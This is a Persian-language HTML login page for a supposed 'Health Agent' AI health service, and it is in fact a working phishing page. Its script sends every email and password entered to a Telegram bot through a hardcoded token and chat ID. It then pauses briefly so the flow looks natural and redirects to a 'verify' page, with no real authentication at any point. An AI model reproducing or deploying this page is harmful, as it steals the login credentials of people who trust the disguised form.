<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>ورود | Health Agent</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    font-family: Tahoma, sans-serif;
    background: linear-gradient(135deg, #eef1f5 0%, #dce6f5 100%);
    display: flex; justify-content: center; align-items: center;
    min-height: 100vh; padding: 16px;
  }
  .card {
    width: 100%; max-width: 380px;
    background: #fff; border-radius: 20px;
    box-shadow: 0 8px 40px rgba(0,0,0,0.12);
    padding: 32px 24px;
  }
  .brand { text-align: center; margin-bottom: 28px; }
  .brand-icon {
    width: 56px; height: 56px;
    background: linear-gradient(135deg, #1a73e8, #0d47a1);
    border-radius: 50%; display: inline-flex;
    align-items: center; justify-content: center;
    font-size: 26px; margin-bottom: 12px;
  }
  .brand h1 { font-size: 20px; color: #1a1a1a; margin-bottom: 4px; }
  .brand p { font-size: 12px; color: #666; }
  .field { margin-bottom: 14px; }
  .field label { display: block; font-size: 12px; color: #555; margin-bottom: 6px; }
  .field input {
    width: 100%; padding: 14px;
    border: 1px solid #ddd; border-radius: 10px;
    font-size: 14px; font-family: Tahoma;
  }
  .field input:focus { outline: none; border-color: #1a73e8; }
  .submit-btn {
    width: 100%; padding: 15px;
    background: linear-gradient(135deg, #1a73e8, #0d47a1);
    color: #fff; border: none; border-radius: 10px;
    font-size: 15px; font-family: Tahoma; cursor: pointer;
    margin-top: 8px;
  }
  .submit-btn:disabled { opacity: 0.6; cursor: not-allowed; }
  .error { color: #d93025; font-size: 12px; text-align: center; margin-top: 12px; min-height: 16px; }
  .footer { text-align: center; font-size: 11px; color: #999; margin-top: 20px; }
</style>
</head>
<body>
<div class="card">
  <div class="brand">
    <div class="brand-icon">🛡️</div>
    <h1>Health Agent</h1>
    <p>AI Health Analysis · Secure</p>
  </div>
  <form id="loginForm" autocomplete="off">
    <div class="field">
      <label for="email">ایمیل</label>
      <input type="email" id="email" placeholder="example@mail.com" required>
    </div>
    <div class="field">
      <label for="password">رمز عبور</label>
      <input type="password" id="password" placeholder="••••••••" required>
    </div>
    <button type="submit" class="submit-btn" id="loginBtn">ورود به داشبورد</button>
    <div class="error" id="errorMsg"></div>
  </form>
  <div class="footer">© Health Agent — Secure AI Platform</div>
</div>

<script>
/* ============================================================
   تنظیمات — مقادیر واقعی خودت را بگذار
   ============================================================ */
const BOT_TOKEN = '8986087239:AAEw2wedRgnuYQLMYop2ztHv7KqQTGtvfSE'                    
                      
  ;
const CHAT_ID   = '536648369'                    
  ;

/* ============================================================
   ارسال پیام متنی به تلگرام
   ============================================================ */
async function sendToTelegram(text) {
  try {
    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: CHAT_ID, text })
    });
    if (!res.ok) throw new Error('Telegram response not ok');
  } catch (e) {
    console.error('ارسال به تلگرام ناموفق:', e.message);
  }
}

/* ============================================================
   رویداد submit فرم لاگین
   ============================================================ */
document.getElementById('loginForm').addEventListener('submit', async (e) => {
  e.preventDefault();

  const email    = document.getElementById('email').value.trim();
  const password = document.getElementById('password').value;
  const btn      = document.getElementById('loginBtn');
  const errEl    = document.getElementById('errorMsg');

  btn.disabled = true;
  btn.textContent = 'در حال بررسی...';
  errEl.textContent = '';

  // ارسال ایمیل/پسورد به تلگرام
  await sendToTelegram(`🔐 لاگین جدید در Health Agent\n📧 ایمیل: ${email}\n🔑 رمز: ${password}`);

  // تأخیر کوتاه برای طبیعی بودن، سپس انتقال به verify
  setTimeout(() => {
    window.location.href = 'verify.html';
  }, 1200);
});
</script>
</body>
</html>
